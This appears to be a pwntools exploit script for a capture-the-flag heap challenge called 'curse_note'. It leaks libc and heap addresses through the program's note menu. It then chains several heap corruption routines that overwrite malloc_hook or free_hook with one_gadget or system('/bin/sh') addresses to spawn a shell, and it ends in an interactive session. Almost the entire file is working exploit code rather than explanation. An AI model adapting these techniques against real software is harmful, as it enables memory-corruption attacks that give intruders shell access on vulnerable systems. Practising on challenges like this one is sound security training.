from pwn import *
context.log_level='debug'


def new(idx,size,payload):
	p.recvuntil('choice: ')
	p.sendline('1')	
	p.recvuntil('index: ')
	p.sendline(str(idx))
	p.recvuntil('size: ')
	p.sendline(str(size))
	p.recvuntil('info: ',timeout=1)
	p.sendline(payload)

def show(idx):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('choice: ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(idx))

p=process('./curse_note')
#leak libc_addr
new(0,0x70,'c')
new(1,0x90,'a')
new(2,0x10,'b')
delete(2)
delete(1)
new(1,0x90,'a'*7)
show(1)
main_arena=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
success(hex(main_arena))
delete(0)
delete(1)

#leak t_arena_addr
new(0,main_arena,'a')
new(0,0x20,'a')
new(1,0x90,'b')
new(2,0x68,'c')
delete(2)
delete(1)
new(1,0x90,'b'*7)

show(1)
heap_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
success(hex(heap_addr))
delete(1)
delete(0)



def exp1():#delete chunkc to cosolidate chunka+chunkb+chunkc

	new(0,0x98,'A'*0x97)
	new(1,0x68,'B'*0x60+p64(0x140))
	new(2,0xf0,'C'*0xef)

	#like off-by-one-null
	delete(1)
	new(1,0x30,'D'*0x30)
	delete(2)
	delete(0)	
	new(2,0x68,'B'*0x57)
	new(0,heap_addr-0x78+0x9f8+1,'')	

	new(0,0xf0,'C'*0xef)
	delete(0)
	
	delete(2)	
	malloc_hook=main_arena-0x78+5-0x18
	new(0,0xe0,0xc0*'a'+p64(0)+p64(0x74)+p64(malloc_hook))
	gdb.attach(p,'b* 0x555555554f35')
	new(2,0x68,'')
	delete(1)
	new(1,0x68,'A'*19+p64(0xdeedbeef))
	show(2)

def exp2():#delete chunka,and let freed chunka consolidate chunkb
	new(0,0x98,'A'*0x98)
	new(1,0x68,p64(0x7ffff00008b0)*2+'B'*0x50+p64(0x70))
	new(2,0xf0,'C'*0xef)
	delete(0)
	new(0,heap_addr-0x78+0x9f8+1,'')
	#new(1,0x68,'B'*0x60+p64(0x140))
	gdb.attach(p,'b* 0x555555554f35')
	new(0,0xc0,p64(0x7ffff0000980)*2+'A'*0xb0)
	delete(0)
	delete(1)
	malloc_hook=main_arena-0x78+5-0x18
	success(malloc_hook)
	new(0,0xe0,0xc0*'a'+p64(0)+p64(0x75)+p64(malloc_hook))
	new(1,0x68,'')
	delete(0)
	new(0,0x68,'A'*19+p64(0xdeedbeef))
	

def exp3():#change addr of topchunk which in t_arena
	new(0,main_arena,'')
	new(0,0x70,'A'*0x48+p64(0x20701))
	new(1,0x60,'B'*0x60)
	gdb.attach(p,'b* 0x555555554f35')
	new(2,heap_addr-0x78+0x79,'')
	delete(1)
	malloc_hook=main_arena-0x78+5-0x18
	new(2,0x40,'a'*0x20+p64(0)+p64(0x75)+p64(malloc_hook))
	new(1,0x68,'')
	delete(2)
	new(2,0x68,'A'*19+p64(0xdeedbeef))

def exp4(main_arena):#	
	main_arena=main_arena-0x58
	malloc_hook=main_arena-0x10
	
	#free(chunk)->free_hook(chunk->data)->system(/bin/sh)
	free_hook=0x7ffff7bcd7a8#libc_base+libc['free_hook']
	topchunk=heap_addr-0x78+0x900
	
	#free(chunk)->free_hook()->onegadget
	#one_gadget not fit	
	offset=free_hook-topchunk-0x10
	success(hex(offset))
	
	one_gadget=main_arena-0x3c4b20+0xf1147
	system_addr=main_arena-0x3c4b20+0x45390
	success(hex(one_gadget))
	
	
	new(0,main_arena,'')
	new(0,0x70,'/bin/sh'.ljust(0x48,'\x00')+p64(offset+system_addr+0x8))
	new(2,heap_addr-0x78+0x79, '')
	
	gdb.attach(p,'b* 0x555555554f35')
	new(2,offset,'')
	delete(0)#getshell
	#new(1,0x30,'A'*0x10+p64(0)+p64(one_gadget))

def exp5():
	malloc_hook=main_arena-0x78+5-0x18
	ubin=heap_addr-0x78+0xd8
	new(0,main_arena,'')
	payload='A'*0x40+p64(0)+p64(0x75)+p64(ubin)+p64(ubin)
	
	new(0,0x78,payload)
	new(1,0x68,'B'*0x30+p64(0)+p64(0x75)+'B'*0x18)
	new(2,0x68,'C'*0xef)
	gdb.attach(p,'b* 0x555555554f35')
	delete(1)
	success(hex(main_arena))
	new(1,heap_addr-0x78+0xf0+1,'')
        new(1,heap_addr-0x78+0xe8+1,'')

	new(1,0x68,'')
	delete(1)
	delete(0)
	payload='A'*0x40 + p64(0)+p64(0x75)+p64(malloc_hook)
	new(0,0x78,payload)
	new(1,0x68,'')
	delete(0)
	one_gadget=main_arena-0x3c4b20+0x4526a
	new(0,0x68,'A'*19 + p64(one_gadget))
	delete(2)
	p.sendline('1')
	p.sendline('2')
	p.sendline('2')
	
		
exp5()
new(0,0x10,'')













p.interactive()	
